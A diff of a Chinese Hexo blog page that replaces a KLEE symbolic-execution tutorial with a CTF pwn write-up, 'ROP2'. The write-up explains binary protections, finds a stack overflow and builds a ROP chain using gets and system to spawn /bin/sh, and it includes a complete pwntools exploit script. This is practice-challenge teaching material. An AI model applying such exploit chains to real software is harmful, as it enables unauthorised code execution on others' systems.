@@ -58,19 +58,29 @@
   };
 </script>
 
-  <meta name="description" content="符号执行 通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出  KLEE安装(推荐使用Docker安装)：1234567docker pull klee/klee:2.0持久性容器:当退出容器时，容器里面的内容不会初始化docker run -ti --name=namestring --ulimit=&apos;stack=-1:-1&apos; klee/klee启动容器docker star">
+  <meta name="description" content="64位栈帧学习 writeup本能反应  RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这">
+<meta name="keywords" content="-writeup -pwntools -pwn -rop">
 <meta property="og:type" content="article">
-<meta property="og:title" content="KLEE-符号执行框架">
-<meta property="og:url" content="https://bufsnake.github.io/2019/05/31/KLEE-符号执行框架/index.html">
+<meta property="og:title" content="PWN 学习—某平台ROP2 writeup">
+<meta property="og:url" content="https://bufsnake.github.io/PWN-学习—某平台ROP2-writeup.html">
 <meta property="og:site_name" content="bufsnake">
-<meta property="og:description" content="符号执行 通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出  KLEE安装(推荐使用Docker安装)：1234567docker pull klee/klee:2.0持久性容器:当退出容器时，容器里面的内容不会初始化docker run -ti --name=namestring --ulimit=&apos;stack=-1:-1&apos; klee/klee启动容器docker star">
+<meta property="og:description" content="64位栈帧学习 writeup本能反应  RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-05-31T12:42:11.914Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801133227230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801133542892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801134127503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801134342899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801134235968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801134745690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019080113425954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/201908011352587.png">
+<meta property="og:updated_time" content="2019-08-09T12:01:55.730Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="KLEE-符号执行框架">
-<meta name="twitter:description" content="符号执行 通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出  KLEE安装(推荐使用Docker安装)：1234567docker pull klee/klee:2.0持久性容器:当退出容器时，容器里面的内容不会初始化docker run -ti --name=namestring --ulimit=&apos;stack=-1:-1&apos; klee/klee启动容器docker star">
+<meta name="twitter:title" content="PWN 学习—某平台ROP2 writeup">
+<meta name="twitter:description" content="64位栈帧学习 writeup本能反应  RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190801133227230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
   <link rel="alternate" href="/atom.xml" title="bufsnake" type="application/atom+xml">
-  <link rel="canonical" href="https://bufsnake.github.io/2019/05/31/KLEE-符号执行框架/">
+  <link rel="canonical" href="https://bufsnake.github.io/PWN-学习—某平台ROP2-writeup">
 
 
 <script id="page-configurations">
@@ -84,7 +94,7 @@
   };
 </script>
 
-  <title>KLEE-符号执行框架 | bufsnake</title>
+  <title>PWN 学习—某平台ROP2 writeup | bufsnake</title>
   
   <script async src="https://www.googletagmanager.com/gtag/js?id=UA-145389457-1"></script>
   <script>
@@ -296,7 +306,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://bufsnake.github.io/2019/05/31/KLEE-符号执行框架/">
+    <link itemprop="mainEntityOfPage" href="https://bufsnake.github.io/PWN-学习—某平台ROP2-writeup.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="bufsnake">
@@ -310,7 +320,7 @@
       <header class="post-header">
 
         
-          <h1 class="post-title" itemprop="name headline">KLEE-符号执行框架
+          <h1 class="post-title" itemprop="name headline">PWN 学习—某平台ROP2 writeup
 
             
           </h1>
@@ -327,12 +337,33 @@
                 
               
 
-              <time title="创建时间：2019-05-31 20:21:03 / 修改时间：20:42:11" itemprop="dateCreated datePublished" datetime="2019-05-31T20:21:03+08:00">2019-05-31</time>
+              <time title="创建时间：2019-08-02 17:16:46" itemprop="dateCreated datePublished" datetime="2019-08-02T17:16:46+08:00">2019-08-02</time>
             </span>
           
             
 
             
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-08-09 20:01:55" itemprop="dateModified" datetime="2019-08-09T20:01:55+08:00">2019-08-09</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">-pwn</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -354,43 +385,46 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><blockquote>
-<p>通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出</p>
-</blockquote>
-<h3 id="KLEE"><a href="#KLEE" class="headerlink" title="KLEE"></a>KLEE</h3><h4 id="安装-推荐使用Docker安装-："><a href="#安装-推荐使用Docker安装-：" class="headerlink" title="安装(推荐使用Docker安装)："></a>安装(推荐使用Docker安装)：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker pull klee/klee:2.0</span><br><span class="line"></span><br><span class="line">持久性容器:当退出容器时，容器里面的内容不会初始化</span><br><span class="line">docker run -ti --name=namestring --ulimit='stack=-1:-1' klee/klee</span><br><span class="line"></span><br><span class="line">启动容器</span><br><span class="line">docker start -ai namestring</span><br></pre></td></tr></table></figure>
-<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><blockquote>
-<p>给出的是官方实例的代码</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;klee/klee.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_sign</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x == <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a;</span><br><span class="line">  klee_make_symbolic(&amp;a, <span class="keyword">sizeof</span>(a), <span class="string">"a"</span>);</span><br><span class="line">  <span class="keyword">return</span> get_sign(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h3 id="64位栈帧学习"><a href="#64位栈帧学习" class="headerlink" title="64位栈帧学习"></a>64位栈帧学习</h3><p><img src="https://img-blog.csdnimg.cn/20190801133227230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><h4 id="本能反应"><a href="#本能反应" class="headerlink" title="本能反应"></a>本能反应</h4><p><img src="https://img-blog.csdnimg.cn/20190801133542892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>可以看到程序有三条路径输出</p>
+<p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表<br>Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br>NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br>PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -I ../../include/ -emit-llvm -c -g -O0 -Xclang -<span class="built_in">disable</span>-O0-optnone get_sign.c</span><br></pre></td></tr></table></figure>
+<h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p><img src="https://img-blog.csdnimg.cn/20190801134127503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>编译生成 get_sign.bc 文件，用klee 运行一下</p>
+<p>发现输入一定的长度，程序就崩溃了</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klee get_sign.bc</span><br></pre></td></tr></table></figure>
+<h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><p><img src="https://img-blog.csdnimg.cn/20190801134342899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>输出如下</p>
+<p>查看要程序逻辑<br>发现存在栈溢出漏洞<br>输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">klee@2038f8489243:~/klee_src/examples/get_sign$ klee get_sign.bc </span><br><span class="line">KLEE: output directory is <span class="string">"/home/klee/klee_src/examples/get_sign/klee-out-1"</span></span><br><span class="line">KLEE: Using STP solver backend</span><br><span class="line"></span><br><span class="line">KLEE: <span class="keyword">done</span>: total instructions = 33</span><br><span class="line">KLEE: <span class="keyword">done</span>: completed paths = 3</span><br><span class="line">KLEE: <span class="keyword">done</span>: generated tests = 3</span><br></pre></td></tr></table></figure>
+<h5 id="查看函数表"><a href="#查看函数表" class="headerlink" title="查看函数表"></a>查看函数表</h5><p><img src="https://img-blog.csdnimg.cn/20190801134235968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="发现函数joke"><a href="#发现函数joke" class="headerlink" title="发现函数joke"></a>发现函数joke</h5><p><img src="https://img-blog.csdnimg.cn/20190801134745690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>可以看到一共有33条指令,完成路径3条，产生3个测试用例</p>
+<p>似乎用不到的函数</p>
 </blockquote>
+<h5 id="接下来查看字符串"><a href="#接下来查看字符串" class="headerlink" title="接下来查看字符串"></a>接下来查看字符串</h5><p><img src="https://img-blog.csdnimg.cn/2019080113425954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>接下来看一下klee-last文件夹，里面存放的就是测试用例</p>
+<p>我无敌的/bin/sh字符串竟然没有，还好有gets和system函数</p>
 </blockquote>
+<h5 id="思考利用方法"><a href="#思考利用方法" class="headerlink" title="思考利用方法"></a>思考利用方法</h5><blockquote>
+<p>调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”);</p>
+</blockquote>
+<h5 id="实操过程"><a href="#实操过程" class="headerlink" title="实操过程"></a>实操过程</h5><p><img src="https://img-blog.csdnimg.cn/201908011352587.png" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>输入如下命令,即可查看.ktest文件夹的内容</p>
+<p>这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数<br>pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中<br>所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)<br>程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ktest-tool test000001.ktest</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>输出如下</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ktest file : <span class="string">'test000001.ktest'</span></span><br><span class="line">args       : [<span class="string">'get_sign.bc'</span>]</span><br><span class="line">num objects: 1</span><br><span class="line">object 0: name: <span class="string">'a'</span></span><br><span class="line">object 0: size: 4</span><br><span class="line">object 0: data: b<span class="string">'\x00\x00\x00\x00'</span></span><br><span class="line">object 0: hex : 0x00000000</span><br><span class="line">object 0: int : 0</span><br><span class="line">object 0: uint: 0</span><br><span class="line">object 0: text: ....</span><br></pre></td></tr></table></figure>
-<h3 id="明日计划"><a href="#明日计划" class="headerlink" title="明日计划"></a>明日计划</h3><p>白天：全国大学生信息安全竞赛</p>
-<p>赛后：继续学习符号执行框架</p>
+<pre><code>接下来时调用system函数
 
+&gt; 我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方
+&gt; 我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，
+&gt; gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用
+</code></pre><h5 id="此时栈空间如图"><a href="#此时栈空间如图" class="headerlink" title="此时栈空间如图"></a>此时栈空间如图</h5><pre><code>![在这里插入图片描述](https://img-blog.csdnimg.cn/20190801142905989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70)
+</code></pre><h5 id="附上payload"><a href="#附上payload" class="headerlink" title="附上payload"></a>附上payload</h5><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = remote(<span class="string">"ip"</span>,port)</span><br><span class="line">pros = ELF(<span class="string">'./rop2'</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6010F0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008e3</span></span><br><span class="line"></span><br><span class="line">system_addr = pros.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_addr = pros.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> +<span class="string">'a'</span>*<span class="number">8</span> </span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)</span><br><span class="line">pro.readuntil(<span class="string">"~"</span>)</span><br><span class="line">pro.sendline(payload)</span><br><span class="line">pro.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20190801140937646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70)
+</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><pre><code>&gt; PWN 学习之路永无止境
+</code></pre>
     </div>
     <div>
       
@@ -410,6 +444,34 @@
       <div>
             
                
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+    <!-- JS库 sweetalert 可修改路径 -->
+    <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <p><span>本文标题:</span><a href="/PWN-学习—某平台ROP2-writeup.html">PWN 学习—某平台ROP2 writeup</a></p>
+    <p><span>文章作者:</span><a href="/" title="访问 bufsnake 的个人博客">bufsnake</a></p>
+    <p><span>发布时间:</span>2019年08月02日 - 17:08</p>
+    <p><span>最后更新:</span>2019年08月09日 - 20:08</p>
+    <p><span>原始链接:</span><a href="/PWN-学习—某平台ROP2-writeup.html" title="PWN 学习—某平台ROP2 writeup">https://bufsnake.github.io/PWN-学习—某平台ROP2-writeup.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bufsnake.github.io/PWN-学习—某平台ROP2-writeup.html" aria-label="复制成功！"></i></span>
+    </p>
+    <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+       var clipboard = new Clipboard('.fa-clipboard');
+       $(".fa-clipboard").click(function(){
+       clipboard.on('success', function(){
+       swal({   
+           title: "",   
+           text: '复制成功',
+           icon: "success", 
+           showConfirmButton: true
+       });
+       });
+      });  
+</script>
+
 
             
       </div>
@@ -417,14 +479,23 @@
       
 
       <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/writeup-pwntools-pwn-rop/" rel="tag"># -writeup -pwntools -pwn -rop</a>
+            
+          </div>
+        
 
         
 
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/05/30/miasm框架安装/" rel="next" title="miasm框架安装">
-                  <i class="fa fa-chevron-left"></i> miasm框架安装
+                <a href="/WDF-helloworld.html" rel="next" title="WDF-helloworld">
+                  <i class="fa fa-chevron-left"></i> WDF-helloworld
                 </a>
               
             </div>
@@ -432,10 +503,6 @@
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/06/02/WDF-helloworld/" rel="prev" title="WDF-helloworld">
-                  WDF-helloworld <i class="fa fa-chevron-right"></i>
-                </a>
               
             </div>
           </div>
@@ -667,7 +734,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#符号执行"><span class="nav-number">1.</span> <span class="nav-text">符号执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#KLEE"><span class="nav-number">2.</span> <span class="nav-text">KLEE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#安装-推荐使用Docker安装-："><span class="nav-number">2.1.</span> <span class="nav-text">安装(推荐使用Docker安装)：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简单使用"><span class="nav-number">2.2.</span> <span class="nav-text">简单使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#明日计划"><span class="nav-number">3.</span> <span class="nav-text">明日计划</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#64位栈帧学习"><span class="nav-number">1.</span> <span class="nav-text">64位栈帧学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup"><span class="nav-number">2.</span> <span class="nav-text">writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#本能反应"><span class="nav-number">2.1.</span> <span class="nav-text">本能反应</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#执行程序"><span class="nav-number">2.2.</span> <span class="nav-text">执行程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ida打开程序"><span class="nav-number">2.3.</span> <span class="nav-text">ida打开程序</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#查看函数表"><span class="nav-number">2.3.1.</span> <span class="nav-text">查看函数表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#发现函数joke"><span class="nav-number">2.3.2.</span> <span class="nav-text">发现函数joke</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#接下来查看字符串"><span class="nav-number">2.3.3.</span> <span class="nav-text">接下来查看字符串</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#思考利用方法"><span class="nav-number">2.3.4.</span> <span class="nav-text">思考利用方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实操过程"><span class="nav-number">2.3.5.</span> <span class="nav-text">实操过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#此时栈空间如图"><span class="nav-number">2.3.6.</span> <span class="nav-text">此时栈空间如图</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#附上payload"><span class="nav-number">2.3.7.</span> <span class="nav-text">附上payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
